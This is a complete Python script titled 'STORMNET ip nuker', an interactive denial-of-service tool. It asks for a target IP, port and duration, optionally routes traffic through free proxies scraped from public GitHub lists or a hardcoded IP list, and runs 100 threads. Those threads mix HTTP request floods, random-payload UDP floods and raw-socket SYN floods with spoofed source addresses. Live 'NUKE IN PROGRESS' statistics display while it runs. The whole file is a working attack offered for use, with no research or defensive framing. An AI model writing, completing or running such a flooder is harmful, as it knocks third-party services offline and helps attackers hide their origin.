#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
STORMNET
ip nuker
"""
import os
import sys
import time
import socket
import random
import threading
import subprocess
import platform
import struct
import urllib.request
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def width():
    try:
        return os.get_terminal_size().columns
    except:
        return 80

# ─── BANNER ─────────────────────────────────────────────────
BANNER_ART = """
  ██████ ▄▄▄█████▓ ▒█████   ██▀███   ███▄ ▄███▓ ███▄    █ ▓█████▄▄▄█████▓
▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▀█▀ ██▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▓██    ▓██░▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
  ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ▒██    ▒██ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒▒██▒   ░██▒▒██░   ▓██░░▒████▒ ▒██▒ ░ 
▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ░  ░░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░▒ ░ ▒░░  ░      ░░ ░░   ░▒ ░ ░  ░   ░    
░  ░  ░    ░      ░ ░ ░ ▒    ░░   ░ ░      ░      ░   ░ ░    ░    ░      
      ░               ░ ░     ░            ░            ░    ░  ░        
"""

def banner():
    w = width()
    print("=" * (w - 1))
    for line in BANNER_ART.strip('\n').split('\n'):
        print(line)
    print("=" * (w - 1))

# ─── MENU ───────────────────────────────────────────────────
def menu():
    clear()
    banner()
    print("""
  [1] Ip Nuker              
  [2] Exit

  select option: """, end='')

# ─── PROXY FETCHER ──────────────────────────────────────────
class ProxyFetcher:
    def __init__(self):
        self.proxies = []
        self.valid = []
    
    def fetch(self, limit=40):
        print("\n[proxy] fetching free proxies...")
        
        sources = [
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt'
        ]
        
        for url in sources:
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
                with urllib.request.urlopen(req, timeout=8) as res:
                    data = res.read().decode('utf-8')
                    for line in data.strip().split('\n')[:50]:
                        line = line.strip()
                        if line and ':' in line and '.' in line:
                            self.proxies.append(line)
            except:
                continue
        
        if not self.proxies:
            self.proxies = [
                '51.158.68.133:8811',
                '8.213.137.6:8080',
                '154.85.58.149:80',
                '103.152.112.162:80',
                '185.162.231.82:80',
                '37.157.141.194:8080',
                '162.223.90.130:80'
            ]
        
        print(f"[proxy] {len(self.proxies)} found, testing...")
        self._test(limit)
        return self.valid
    
    def _test(self, limit):
        def check(proxy):
            try:
                ip, port = proxy.split(':')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((ip, int(port)))
                s.close()
                if result == 0:
                    return proxy
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=25) as ex:
            futures = [ex.submit(check, p) for p in self.proxies[:limit * 3]]
            for f in as_completed(futures):
                r = f.result()
                if r and len(self.valid) < limit:
                    self.valid.append(r)
        
        print(f"[proxy] {len(self.valid)} alive")
        if not self.valid:
            self.valid = [None]
            print("[proxy] none alive, direct mode")

# ─── IP NUKER ───────────────────────────────────────────────
class Nuker:
    def __init__(self, ip, port=80, max_pps=5000):
        self.ip = ip
        self.port = port
        self.max_pps = max_pps
        self.running = True
        self.packets = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()
        self.packet_times = []
        self.agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Firefox/86.0'
        ]
    
    def throttle(self):
        now = time.time()
        with self.lock:
            self.packet_times.append(now)
            self.packet_times = [t for t in self.packet_times if now - t < 1.0]
            if len(self.packet_times) > self.max_pps:
                time.sleep(1.0 / self.max_pps)
    
    def http(self, proxy=None, duration=None):
        end = time.time() + duration if duration else None
        while self.running:
            if end and time.time() >= end:
                break
            self.throttle()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(0.5)
                if proxy:
                    pip, pport = proxy.split(':')
                    s.connect_ex((pip, int(pport)))
                    req = f"CONNECT {self.ip}:{self.port} HTTP/1.1\r\nHost: {self.ip}:{self.port}\r\n\r\n"
                else:
                    s.connect_ex((self.ip, self.port))
                    req = f"GET / HTTP/1.1\r\nHost: {self.ip}\r\nUser-Agent: {random.choice(self.agents)}\r\nConnection: keep-alive\r\n\r\n"
                s.send(req.encode())
                with self.lock:
                    self.packets += 1
                    self.bytes_sent += len(req)
                s.close()
            except:
                pass
    
    def udp(self, duration=None):
        end = time.time() + duration if duration else None
        while self.running:
            if end and time.time() >= end:
                break
            self.throttle()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setblocking(False)
                payload = random.randbytes(random.randint(64, 512))
                s.sendto(payload, (self.ip, self.port))
                with self.lock:
                    self.packets += 1
                    self.bytes_sent += len(payload)
                s.close()
            except:
                pass
    
    def syn(self, duration=None):
        end = time.time() + duration if duration else None
        while self.running:
            if end and time.time() >= end:
                break
            self.throttle()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.setblocking(False)
                sport = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    (4 << 4) + 5, 0, 40, random.randint(0, 65535), 0,
                    255, socket.IPPROTO_TCP, 0,
                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"),
                    socket.inet_aton(self.ip))
                tcp_header = struct.pack('!HHLLBBHHH',
                    sport, self.port, seq, 0,
                    (5 << 4) + 0, 0x02, random.randint(1024, 65535), 0, 0)
                packet = ip_header + tcp_header
                s.sendto(packet, (self.ip, self.port))
                with self.lock:
                    self.packets += 1
                    self.bytes_sent += len(packet)
                s.close()
            except:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.settimeout(0.1)
                    s.connect_ex((self.ip, self.port))
                    with self.lock:
                        self.packets += 1
                    s.close()
                except:
                    pass
    
    def run(self, proxies, duration=60, threads=100):
        clear()
        banner()
        print(f"""
+{'=' * 60}+
|  TARGET LOCKED - MAX POWER                    |
+{'=' * 60}+
  target      {self.ip}:{self.port}
  duration    {duration}s
  threads     {threads}
  proxies     {len(proxies)}
  rate limit  {self.max_pps} pps
+{'=' * 60}+""")
        
        print("\n[warn] initializing...")
        time.sleep(1)
        print(f"[nuker] launching {threads} threads...")
        
        threads_list = []
        proxy_idx = 0
        
        for i in range(threads):
            proxy = proxies[proxy_idx % len(proxies)] if proxies else None
            proxy_idx += 1
            
            if i % 3 == 0:
                t = threading.Thread(target=self.http, args=(proxy, duration))
            elif i % 3 == 1:
                t = threading.Thread(target=self.udp, args=(duration,))
            else:
                t = threading.Thread(target=self.syn, args=(duration,))
            
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        start = time.time()
        print("[nuker] running...\n")
        
        try:
            while self.running and (time.time() - start) < duration:
                clear()
                banner()
                
                elapsed = time.time() - start
                pps = self.packets / elapsed if elapsed > 0 else 0
                mbps = self.bytes_sent / elapsed / 1024 / 1024 if elapsed > 0 else 0
                progress = int((elapsed / duration) * 55)
                bar = "#" * progress + "-" * (55 - progress)
                
                print(f"""
+{'=' * 60}+
|  NUKE IN PROGRESS                        |
+{'=' * 60}+
  [{bar}]
+{'-' * 60}+
  target      {self.ip}:{self.port}
  packets     {self.packets:,}
  data        {self.bytes_sent / 1024 / 1024:.2f} MB
  rate        {pps:.0f} pps / {mbps:.2f} MB/s
  threads     {len(threads_list)}
  elapsed     {elapsed:.1f}s / {duration}s
+{'=' * 60}+""")
                
                print("\n[ctrl+c to stop]")
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[nuker] stopped by user")
        
        self.running = False
        for t in threads_list:
            t.join(timeout=1)
        
        elapsed = time.time() - start
        clear()
        banner()
        print(f"""
+{'=' * 60}+
|  NUKE COMPLETE - FINAL STATS            |
+{'=' * 60}+
  target      {self.ip}:{self.port}
  packets     {self.packets:,}
  data        {self.bytes_sent / 1024 / 1024:.2f} MB
  duration    {elapsed:.1f}s
  avg rate    {self.packets / elapsed if elapsed > 0 else 0:.0f} pps
+{'=' * 60}+""")
        print("\n[press enter to continue]")
        input()

# ─── MAIN ───────────────────────────────────────────────────
def main():
    while True:
        menu()
        choice = input().strip()
        
        if choice == '1':
            clear()
            banner()
            print("\n[nuker] enter target ip: ", end='')
            ip = input().strip()
            if not ip:
                continue
            
            print("[nuker] port [80]: ", end='')
            port_input = input().strip()
            port = int(port_input) if port_input else 80
            
            print("[nuker] duration in seconds [60]: ", end='')
            dur_input = input().strip()
            duration = int(dur_input) if dur_input else 60
            
            print("[nuker] use proxies? [y/n]: ", end='')
            use_proxy = input().strip().lower()
            
            proxies = [None]
            if use_proxy == 'y':
                pf = ProxyFetcher()
                proxies = pf.fetch(40)
            
            nuker = Nuker(ip, port)
            nuker.run(proxies, duration, 100)
        
        elif choice == '2':
            clear()
            print("[exit] shutting down")
            break
        
        else:
            print("[error] invalid option")
            time.sleep(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print("\n[exit] terminated")
        sys.exit(0)